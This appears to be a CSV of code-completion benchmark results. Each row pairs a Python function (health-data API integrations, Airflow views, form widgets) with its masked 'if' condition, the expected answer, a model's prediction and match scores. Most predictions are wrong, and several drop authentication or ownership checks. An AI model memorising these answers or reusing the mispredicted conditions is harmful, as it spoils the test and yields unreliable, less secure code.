input_function,expected_condition,predicted_condition,exact_match,bleu_score
"def fetch_fitbit_data(fitbit_member): """""" Fetches all of the fitbit data for a given user """""" restart_job = None fitbit_urls = [{'name': 'activities-overview', 'url': '/{user_id}/activities.json', 'period': None}, {'name': 'heart', 'url': '/{user_id}/activities/heart/date/{start_date}/{end_date}.json', 'period': 'month'}, {'name': 'tracker-activity-calories', 'url': '/{user_id}/activities/tracker/activityCalories/date/{start_date}/{end_date}.json', 'period': 'month'}, {'name': 'tracker-calories', 'url': '/{user_id}/activities/tracker/calories/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-distance', 'url': '/{user_id}/activities/tracker/distance/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-elevation', 'url': '/{user_id}/activities/tracker/elevation/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-floors', 'url': '/{user_id}/activities/tracker/floors/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-fairly-active', 'url': '/{user_id}/activities/tracker/minutesFairlyActive/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-lightly-active', 'url': '/{user_id}/activities/tracker/minutesLightlyActive/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-sedentary', 'url': '/{user_id}/activities/tracker/minutesSedentary/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-very-active', 'url': '/{user_id}/activities/tracker/minutesVeryActive/date",not fitbit_data,fitbit_member.name == 'restart_job',0.0,8.392229812593097
"def get_existing_fitbit(oh_member, fitbit_urls): print('entered get_existing_fitbit') for dfile in oh_member.list_files(): if: print('got inside fitbit if') tf_in = tempfile.NamedTemporaryFile(suffix='.json') tf_in.write(requests.get(dfile['download_url']).content) tf_in.flush() fitbit_data = json.load(open(tf_in.name)) print('fetched existing data from OH') return (fitbit_data, dfile['id']) fitbit_data = {} for url in fitbit_urls: fitbit_data[url['name']] = {} return (fitbit_data, None)",'QF-Fitbit' in dfile['metadata']['tags'],'fitbit' in dfile['name'],0.0,19.692104496063735
"def complete_garmin(self, redirect_response, resource_owner_secret): throwaway_oauth = OAuth1Session(client_key=self._consumer_key, client_secret=self._consumer_secret) oauth_response = throwaway_oauth.parse_authorization_response(redirect_response) self.oauth = OAuth1Session(client_key=self._consumer_key, client_secret=self._consumer_secret, resource_owner_key=oauth_response['oauth_token'], resource_owner_secret=resource_owner_secret, verifier=oauth_response['oauth_verifier']) _LOGGER.debug('Fetching OAuth1 (3/3) token to %s', ACCESS_TOKEN_URL) self.oauth.fetch_access_token(ACCESS_TOKEN_URL) if: return else: raise Exception('Garmin authorization failed')",self.authorized,self.oauth,0.0,0.0
"@task def handle_backfill(garmin_user_id): garmin_member = GarminMember.objects.get(userid=garmin_user_id) oauth = OAuth1Session(client_key=settings.GARMIN_KEY, client_secret=settings.GARMIN_SECRET, resource_owner_key=garmin_member.access_token, resource_owner_secret=garmin_member.access_token_secret) end_date = datetime.utcnow() start_date = end_date - timedelta(days=DAYS_PER_BACKFILL) while start_date.year >= MIN_GARMIN_YEAR: start_epoch = unix_time_seconds(start_date) end_epoch = unix_time_seconds(end_date) summary_url = 'https://healthapi.garmin.com/wellness-api/rest/backfill/dailies?summaryStartTimeInSeconds={}&summaryEndTimeInSeconds={}'.format(start_epoch, end_epoch) res = oauth.get(url=summary_url) if: raise Exception('Invalid backlfill query response: {},{}'.format(res.content, res.status_code)) else: print('Called async backfill for {}-{}'.format(start_date, end_date)) time.sleep(SLEEP_BETWEEN_BACKFILL_CALLS_SECS) end_date = end_date - timedelta(days=DAYS_PER_BACKFILL) start_date = start_date - timedelta(days=DAYS_PER_BACKFILL) return res",res.status_code != 202,not res.content,0.0,11.752701606523267
"def is_empty_aggregate_result(result): for bucket in result.get('bucket', {}): ds = bucket['dataset'] for data in ds: if: return False return True",data['point'] != [],len(data) == 0,0.0,6.770186228657864
"def _refresh_tokens(self): """""" Refresh access token. """""" credentials = google.oauth2.credentials.Credentials(token=self.access_token, refresh_token=self.refresh_token, token_uri=settings.GOOGLEFIT_TOKEN_URI, client_id=settings.GOOGLEFIT_CLIENT_ID, client_secret=settings.GOOGLEFIT_CLIENT_SECRET, scopes=settings.GOOGLEFIT_SCOPES) if: request = google.auth.transport.requests.Request() credentials.refresh(request) self.access_token = credentials.token if credentials.refresh_token: self.refresh_token = credentials.refresh_token self.expiry_date = credentials.expiry self.save() return True return False",credentials.valid,credentials.token,0.0,0.0
"def update_googlefit(request): if: openhumansmember = request.user.openhumansmember googlefit_member = openhumansmember.googlefit_member update_googlefit_data.delay(request.user.openhumansmember.oh_id, request.user.id) googlefit_member.last_submitted_for_update = arrow.now().format() googlefit_member.save() messages.info(request, 'An update of your GoogleFit data has been started! It can take some minutes before the first data is available. Reload this page in a while to find your data.') return redirect('/')",request.method == 'POST' and request.user.is_authenticated,request.method == 'POST',0.0,26.359713811572682
"def update_openhumans_reportslist(oh_member): """""" Update symptom reports data stored in Open Humans member account. """""" reports = SymptomReport.objects.filter(member=oh_member).order_by('-created') try: timezone = oh_member.checkinschedule.timezone except CheckinSchedule.DoesNotExist: timezone = pytz.timezone('UTC') old_fid = None for dfile in oh_member.list_files(): if 'QF-SymptomReports' in dfile['metadata']['tags']: old_fid = dfile['id'] break metadata = {'description': 'Symptom reports data from QF.', 'tags': ['QF-SymptomReports', 'quantified flu'], 'updated_at': str(datetime.utcnow())} data = {'reports': [json.loads(r.as_json()) for r in reports], 'timezone': str(timezone)} with tempfile.TemporaryFile() as f: js = json.dumps(data) js = str.encode(js) f.write(js) f.flush() f.seek(0) oh_member.upload(stream=f, filename='QF-symptomreport-data.json', metadata=metadata) if: oh_member.delete_single_file(file_id=old_fid)",old_fid,old_fid,1.0,0.0
"def as_json(self): if: fever = '' else: fever = float(self.fever) data = {'created': self.created.isoformat(), 'symptoms': self.get_symptom_values(), 'other_symptoms': self.other_symptoms, 'fever_guess': self.fever_guess, 'fever': fever, 'suspected_virus': self.suspected_virus, 'notes': self.notes} return json.dumps(data)","isinstance(self.fever, type(None))",self.fever is None,0.0,12.869637315183779
"def view_graph(request, analysis_id): analysis = RetrospectiveEventAnalysis.objects.get(id=analysis_id) if: context = {'analysis_id': analysis_id, 'analysis_type': analysis.graph_type} return render(request, 'retrospective/graph_view.html', context) else: return redirect('/')",analysis.event.member_id == request.user.openhumansmember.oh_id,analysis.graph_type,0.0,1.7560903341711829
"def _trigger_dag(self, dag_id: str, dag_bag: DagBag, dag_run: DagRun): dag = dag_bag.get_dag(dag_id) if: raise DagNotFound(f'Dag id {dag_id} not found') execution_date = timezone.utcnow() run_id = f'rb_status_manual__{execution_date.isoformat()}' dag_run_id = dag_run.find(dag_id=dag_id, run_id=run_id) if dag_run_id: raise DagRunAlreadyExists(f'Run id {run_id} already exists for dag id {dag_id}') dag.create_dagrun(run_id=run_id, execution_date=execution_date, state=State.RUNNING, external_trigger=True)",dag_id not in dag_bag.dags,dag is None,0.0,0.0
"def __call__(self, field, **kwargs): kwargs['class'] = u'my_select2 form-control' if: kwargs['class'] = kwargs['class'] + ' ' + self.extra_classes kwargs['style'] = self.style if 'name_' in kwargs: field.name = kwargs['name_'] return super(Select2Widget, self).__call__(field, **kwargs)",self.extra_classes,'class' in kwargs,0.0,0.0
"def __call__(self, field, **kwargs): kwargs['class'] = u'my_select2 form-control' if: kwargs['class'] = kwargs['class'] + ' ' + self.extra_classes kwargs['style'] = self.style kwargs['multiple'] = u'true' if 'name_' in kwargs: field.name = kwargs['name_'] return super(Select2ManyWidget, self).__call__(field, **kwargs)",self.extra_classes,'class' in kwargs,0.0,0.0
"@expose('/paused', methods=['POST']) def pause_dag(self): r_args = request.args report_name = r_args.get('report_name') r = Report(report_name) if: r.activate_dag() else: r.pause_dag() return 'OK'",r_args.get('is_paused') == 'true',r_args.get('activate_dag'),0.0,41.15421581016571
"@expose('/<string:report_title>/edit', methods=['GET']) @has_access def this_form_get(self, report_title): self._init_vars() form = self.form.refresh() form = self.form_get(form, report_title) form.tests.choices = get_all_test_choices() if: widgets = self._get_edit_widget(form=form) self.update_redirect() return self.render_template(self.form_template, title=self.form_title, widgets=widgets, appbuilder=self.appbuilder) flash(f'report title ({report_title}) not found.', 'error') return redirect(url_for('ReportsView.list'))",form,form.validate_on_submit(),0.0,4.767707020457095
"@property def postgrest(self): if: self._postgrest = self._init_postgrest_client(rest_url=self.rest_url, headers=self.options.headers, schema=self.options.schema, timeout=self.options.postgrest_client_timeout) return self._postgrest",self._postgrest is None,self._postgrest is None,1.0,100.00000000000004
"def handle_files(self): time.sleep(2) path = ntpath.join(self.astroPath, self.moveToPath) try: if: os.makedirs(path) except Exception as e: AstroLogging.logPrint(e, 'error') now = time.time() try: for f in os.listdir(path): fpath = ntpath.join(path, f) if os.stat(fpath).st_mtime < now - self.retentionPeriodHours * 60 * 60: os.remove(fpath) except Exception as e: AstroLogging.logPrint(e, 'error') AstroLogging.logPrint('Copying backup(s) to retention folder.', dwet='b') try: dirName = ntpath.dirname(self.pendingFiles[0]) fileNames = [ntpath.join(dirName, f) for f in os.listdir(dirName) if ntpath.isfile(ntpath.join(dirName, f))] for cFile in fileNames: shutil.copy2(cFile, path) except FileNotFoundError as e: AstroLogging.logPrint(e, 'error') except Exception as e: AstroLogging.logPrint(e, 'error') self.launcher.backupObserver.stop() self.launcher.backup_retention()",not ntpath.exists(path),not ntpath.exists(path),1.0,100.00000000000004
